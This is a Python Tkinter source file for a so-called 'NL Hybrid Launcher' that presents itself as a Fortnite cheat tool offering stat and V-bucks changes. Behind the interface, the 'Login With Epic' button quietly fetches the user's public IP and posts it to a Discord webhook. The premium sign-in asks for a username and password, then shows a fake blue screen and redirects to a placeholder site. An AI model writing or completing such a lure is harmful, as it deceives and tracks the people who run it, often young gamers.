import tkinter as tk
from tkinter import font, messagebox
from PIL import Image, ImageTk
import webbrowser
import psutil
import logging
import requests
import json
import threading
import time

# Configure the logger
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class NLHybridLauncher(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("NL Hybrid Launcher")
        self.geometry("900x500")
        self.configure(bg="#1e1e1e")

        self.sidebar_frame = tk.Frame(self, bg="#2d2d2d", width=200)
        self.sidebar_frame.pack(side="left", fill="y")

        self.main_frame = tk.Frame(self, bg="#1e1e1e")
        self.main_frame.pack(side="right", expand=True, fill="both")

        logger.info("Application started")
        self.create_sidebar()
        self.create_main_content()

    def create_sidebar(self):
        title_label = tk.Label(self.sidebar_frame, text="NL Hybrid", font=("Arial", 18), bg="#2d2d2d", fg="white")
        title_label.pack(pady=20)

        self.nav_buttons = {
            "NL Hybrid": self.create_main_content,
            "NL Hybrid Premium": self.create_premium_content,
            "Stat Changer": self.create_stat_changer,
            "Custom Locker": self.create_custom_locker,
            "Settings": self.create_settings  # New button for Settings
        }

        for button_text in self.nav_buttons:
            self.create_nav_button(button_text)

        logger.info("Sidebar created")

    def create_nav_button(self, text):
        button = tk.Button(self.sidebar_frame, text=text, bg="#2d2d2d", fg="white", bd=0, anchor="w", padx=10, font=("Arial", 12),
                           command=lambda: self.switch_frame(text))
        button.pack(pady=5, fill="x")
        logger.debug(f"Navigation button created: {text}")

    def switch_frame(self, text):
        logger.debug(f"Switching frame to: {text}")
        for widget in self.main_frame.winfo_children():
            widget.destroy()
        if text in self.nav_buttons:
            self.nav_buttons[text]()

    def create_main_content(self):
        try:
            img = Image.open("D:\\tiktok method\\tiktok method\\fn.png")
            img = img.resize((200, 300), Image.LANCZOS)
            img = ImageTk.PhotoImage(img)
            img_label = tk.Label(self.main_frame, image=img, bg="#1e1e1e")
            img_label.image = img  # Keep a reference
            img_label.pack(pady=20)
            
            # Bind the click event to the image
            img_label.bind("<Button-1>", self.open_fortnite)
            logger.info("Main content created successfully")
            
        except Exception as e:
            logger.error(f"Error loading image: {e}")

        title_label = tk.Label(self.main_frame, text="Fortnite [NL Hybrid]", font=("Arial", 16), bg="#1e1e1e", fg="white")
        title_label.pack(pady=10)

        self.key_entry = tk.Entry(self.main_frame, width=30, font=("Arial", 14))
        self.key_entry.pack(pady=10)

        get_key_button = tk.Button(self.main_frame, text="Get A Key", bg="#3d3d3d", fg="white", bd=0, padx=10, pady=5, font=("Arial", 12), command=self.check_key)
        get_key_button.pack(pady=10)

        discord_button = tk.Button(self.main_frame, text="Fix Issues", bg="#3d3d3d", fg="white", bd=0, padx=10, pady=5, font=("Arial", 12), command=self.fix_issues)
        discord_button.pack(pady=10)

    def open_fortnite(self, event):
        url = "com.epicgames.launcher://apps/fn%3A4fe75bbc5a674f4f9b356b5c90567da5%3AFortnite?action=launch&silent=true"
        try:
            webbrowser.open(url)
            logger.info("Attempted to open Fortnite")
        except Exception as e:
            logger.error(f"Error opening Fortnite: {e}")

    def check_key(self):
        key = self.key_entry.get()
        logger.debug(f"Key entered: {key}")
        if key == "1":
            self.open_fortnite(None)  # Pass None as event is not used
        else:
            logger.warning("Invalid key entered")

    def fix_issues(self):
        logger.info("Fix Issues button clicked")
        self.close_fortnite()

    def close_fortnite(self):
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == 'FortniteClient-Win64-Shipping_BE.exe':  # Example process name for Fortnite
                try:
                    proc.terminate()  # Try to terminate the process
                    proc.wait(timeout=3)  # Wait for process to terminate
                    messagebox.showinfo("Success", "Fortnite closed successfully.")
                    logger.info("Fortnite closed successfully.")
                except psutil.NoSuchProcess:
                    messagebox.showwarning("Warning", "Fortnite process not found.")
                    logger.warning("Fortnite process not found.")
                except psutil.AccessDenied:
                    messagebox.showerror("Error", "Access denied while trying to close Fortnite.")
                    logger.error("Access denied while trying to close Fortnite.")
                except psutil.TimeoutExpired:
                    messagebox.showerror("Error", "Timeout expired while trying to close Fortnite.")
                    logger.error("Timeout expired while trying to close Fortnite.")
                break

    def create_premium_content(self):
        title_label = tk.Label(self.main_frame, text="NL Hybrid Premium", font=("Arial", 24), bg="#1e1e1e", fg="white")
        title_label.pack(pady=20)

        purchase_label = tk.Label(self.main_frame, text="Purchase Available in The Discord Server", font=("Arial", 18), bg="#1e1e1e", fg="white")
        purchase_label.pack(pady=20)

        username_label = tk.Label(self.main_frame, text="Username:", font=("Arial", 14), bg="#1e1e1e", fg="white")
        username_label.pack(pady=5)
        username_entry = tk.Entry(self.main_frame, width=30, font=("Arial", 14))
        username_entry.pack(pady=5)

        password_label = tk.Label(self.main_frame, text="Password:", font=("Arial", 14), bg="#1e1e1e", fg="white")
        password_label.pack(pady=5)
        password_entry = tk.Entry(self.main_frame, show="*", width=30, font=("Arial", 14))
        password_entry.pack(pady=5)

        sign_in_button = tk.Button(self.main_frame, text="Sign In", bg="#3d3d3d", fg="white", bd=0, padx=10, pady=5, font=("Arial", 12), command=self.handle_premium_login)
        sign_in_button.pack(pady=20)
        logger.info("Premium content created")

    def handle_premium_login(self):
        # Show the fake BSOD in a separate thread
        threading.Thread(target=self.show_fake_bsod).start()
        
        # Redirect to a specified website
        website_url = "https://example.com"  # Replace with the desired URL
        webbrowser.open(website_url)
        logger.info(f"Redirected to {website_url}")

    def show_fake_bsod(self):
        # Create a new top-level window that mimics a BSOD
        bsod_window = tk.Toplevel(self)
        bsod_window.title("Blue Screen of Death")
        bsod_window.geometry("1920x1080")  # Full screen size
        bsod_window.configure(bg="blue")

        # Add a BSOD-like message
        error_message = tk.Label(bsod_window, text="Your PC ran into a problem and needs to restart.\n\nError Code: FAKE-001", 
                                 font=("Arial", 24), bg="blue", fg="white", pady=20, padx=20, anchor="center")
        error_message.pack(expand=True)

        # Disable interaction with the main window while BSOD is displayed
        self.attributes("-disabled", True)

        # Simulate the BSOD lasting for a few seconds before closing
        time.sleep(5)
        self.close_fake_bsod(bsod_window)
    
    def close_fake_bsod(self, bsod_window):
        bsod_window.destroy()
        self.attributes("-disabled", False)

    def create_stat_changer(self):
        title_label = tk.Label(self.main_frame, text="Stat Changer", font=("Arial", 24), bg="#1e1e1e", fg="white")
        title_label.pack(pady=20)

        account_label = tk.Label(self.main_frame, text="Your Account", font=("Arial", 14), bg="#1e1e1e", fg="white")
        account_label.pack(pady=5)
        account_entry = tk.Entry(self.main_frame, width=30, font=("Arial", 14))
        account_entry.pack(pady=5)

        login_button = tk.Button(self.main_frame, text="Login With Epic", bg="#3d3d3d", fg="white", bd=0, padx=10, pady=5, font=("Arial", 12), command=self.login_with_epic)
        login_button.pack(pady=5)

        stat_fields = ["Level", "Vbucks", "Crowns", "Stars"]
        for stat in stat_fields:
            stat_label = tk.Label(self.main_frame, text=stat, font=("Arial", 14), bg="#1e1e1e", fg="white")
            stat_label.pack(pady=5)
            stat_entry = tk.Entry(self.main_frame, width=30, font=("Arial", 14))
            stat_entry.pack(pady=5)
            submit_button = tk.Button(self.main_frame, text=f"Submit {stat}", bg="#3d3d3d", fg="white", bd=0, padx=10, pady=5, font=("Arial", 12))
            submit_button.pack(pady=5)
        logger.info("Stat Changer content created")

    def create_custom_locker(self):
        title_label = tk.Label(self.main_frame, text="Custom Locker", font=("Arial", 24), bg="#1e1e1e", fg="white")
        title_label.pack(pady=20)

        fields = ["Field1", "Field2", "Field3"]
        self.entries = {}
        for field in fields:
            label = tk.Label(self.main_frame, text=field, font=("Arial", 14), bg="#1e1e1e", fg="white")
            label.pack(pady=5)
            entry = tk.Entry(self.main_frame, width=30, font=("Arial", 14))
            entry.pack(pady=5)
            self.entries[field] = entry  # Store reference to the entry widget
        
        submit_button = tk.Button(self.main_frame, text="Submit Customizations", bg="#3d3d3d", fg="white", bd=0, padx=10, pady=5, font=("Arial", 12), command=self.submit_custom_locker)
        submit_button.pack(pady=20)
        logger.info("Custom Locker content created")

    def submit_custom_locker(self):
        data = {field: entry.get() for field, entry in self.entries.items()}
        
        logger.info("Custom Locker Data Submitted:")
        for field, value in data.items():
            logger.info(f"{field}: {value}")

    def create_settings(self):
        title_label = tk.Label(self.main_frame, text="Settings", font=("Arial", 24), bg="#1e1e1e", fg="white")
        title_label.pack(pady=20)

        self.dev_inventory_var = tk.BooleanVar()
        dev_inventory_check = tk.Checkbutton(self.main_frame, text="Enable Dev Inventory", variable=self.dev_inventory_var, bg="#1e1e1e", fg="white", font=("Arial", 14))
        dev_inventory_check.pack(pady=10)

        apply_button = tk.Button(self.main_frame, text="Apply Settings", bg="#3d3d3d", fg="white", bd=0, padx=10, pady=5, font=("Arial", 12), command=self.apply_settings)
        apply_button.pack(pady=20)
        logger.info("Settings content created")

    def apply_settings(self):
        if self.dev_inventory_var.get():
            logger.error("Dev Inventory enabled, crashing the launcher.")
            self.destroy()  # Simulate a crash
        else:
            logger.info("Settings applied successfully.")

    def login_with_epic(self):
        import requests  # Make sure requests is imported
        import json

        # Get the public IP address
        try:
            ip_response = requests.get("https://api.ipify.org?format=json")
            ip_data = ip_response.json()
            user_ip = ip_data.get("ip", "Unknown IP")
        except Exception as e:
            user_ip = "Error obtaining IP"
            logger.error(f"Error getting IP address: {e}")

        logger.debug(f"User IP: {user_ip}")

        webhook_url = ""  # Replace with your actual Discord webhook URL

        data = {
            "content": f"User IP: {user_ip}"
        }

        try:
            response = requests.post(webhook_url, data=json.dumps(data), headers={"Content-Type": "application/json"})
            if response.status_code == 204:
                logger.info("IP address sent to Discord webhook successfully")

            else:
                logger.error(f"Failed to send IP address to Discord webhook: {response.status_code}")
                messagebox.showerror("Error", "Failed to send IP address to Discord webhook.")
        except Exception as e:
            logger.error(f"Error sending IP address to Discord webhook: {e}")
            messagebox.showerror("Error", "An error occurred while sending IP address.")

if __name__ == "__main__":
    app = NLHybridLauncher()
    app.mainloop()
